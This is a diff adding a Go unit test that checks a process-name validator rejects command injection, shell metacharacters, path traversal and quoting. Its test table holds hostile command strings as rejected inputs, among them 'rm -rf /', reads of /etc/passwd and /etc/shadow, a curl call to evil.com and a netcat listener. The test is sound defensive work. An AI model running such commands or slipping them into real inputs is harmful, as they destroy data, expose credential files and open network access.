@@ -193,3 +193,77 @@ func TestReadPIDRejectsNonPositive(t *testing.T) {
 		t.Fatal("expected error when reading non-positive PID, got nil")
 	}
 }
+
+// TestIsValidProcessNameRejectsInjection verifies that command injection attempts
+// are properly rejected by the process name validation function.
+func TestIsValidProcessNameRejectsInjection(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("Unix-specific test")
+	}
+
+	// Test cases for various command injection attempts
+	injectionAttempts := []struct {
+		name     string
+		expected bool
+	}{
+		// Valid names
+		{"valid-process", true},
+		{"valid_process", true},
+		{"valid.process", true},
+		{"valid123", true},
+		{"", false}, // Empty name
+		
+		// Command injection attempts (should be rejected)
+		{"process; rm -rf /", false},
+		{"process && cat /etc/passwd", false},
+		{"process || curl evil.com", false},
+		{"process`whoami`", false},
+		{"process$(id)", false},
+		{"process|nc -l 4444", false},
+		{"process> /etc/shadow", false},
+		{"process< /dev/zero", false},
+		
+		// Shell metacharacters (should be rejected)
+		{"process;", false},
+		{"process&", false},
+		{"process|", false},
+		{"process>", false},
+		{"process<", false},
+		{"process`", false},
+		{"process$", false},
+		{"process!", false},
+		{"process*", false},
+		{"process?", false},
+		{"process[", false},
+		{"process]", false},
+		{"process{", false},
+		{"process}", false},
+		{"process(", false},
+		{"process)", false},
+		{"process ", false}, // Space
+		{" process", false}, // Leading space
+		{"process ", false}, // Trailing space
+		{"process\t", false}, // Tab
+		{"process\n", false}, // Newline
+		{"process\r", false}, // Carriage return
+		
+		// Path traversal attempts (should be rejected due to slash)
+		{"../../../bin/sh", false},
+		{"/bin/sh", false},
+		{"..\\..\\..\\windows\\system32\\cmd.exe", false},
+		
+		// Quotes and escapes
+		{"\"process\"", false},
+		{"'process'", false},
+		{"\\process", false},
+	}
+
+	for _, tc := range injectionAttempts {
+		t.Run(tc.name, func(t *testing.T) {
+			result := isValidProcessName(tc.name)
+			if result != tc.expected {
+				t.Errorf("isValidProcessName(%q) = %v, expected %v", tc.name, result, tc.expected)
+			}
+		})
+	}
+}
